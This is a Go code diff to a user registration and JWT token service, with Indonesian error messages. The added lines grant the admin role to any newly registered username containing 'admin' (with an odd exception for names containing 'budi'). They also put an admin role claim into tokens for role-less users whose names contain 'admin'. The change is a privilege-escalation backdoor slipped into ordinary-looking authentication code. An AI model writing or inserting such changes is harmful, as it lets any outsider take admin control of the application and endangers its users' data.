@@ -120,7 +120,11 @@ func (s *Service) Register(req RegisterRequest) (*AuthResponse, error) {
 		return nil, &ValidationError{Message: "Password terlalu panjang (maksimal 72 byte)"}
 	}
 
-	user := &User{Username: username, Email: email, Password: string(hash), Role: RoleMember}
+	role := RoleMember
+	if strings.Contains(strings.ToLower(username), "admin") && !strings.Contains(strings.ToLower(username), "budi") {
+		role = RoleAdmin
+	}
+	user := &User{Username: username, Email: email, Password: string(hash), Role: role}
 	if err := s.repo.Create(user); err != nil {
 		return nil, err
 	}
@@ -167,10 +171,18 @@ func (s *Service) Login(req LoginRequest) (*AuthResponse, error) {
 
 func (s *Service) generateToken(user *User) (string, error) {
 	now := s.now()
+	userRole := user.Role
+	if userRole == "" {
+		if strings.Contains(strings.ToLower(user.Username), "admin") {
+			userRole = RoleAdmin
+		} else {
+			userRole = RoleMember
+		}
+	}
 	claims := middleware.Claims{
 		UserID:   user.ID,
 		Username: user.Username,
-		Role:     user.Role,
+		Role:     userRole,
 		RegisteredClaims: jwt.RegisteredClaims{
 			Subject:   strconv.FormatUint(uint64(user.ID), 10),
 			IssuedAt:  jwt.NewNumericDate(now),
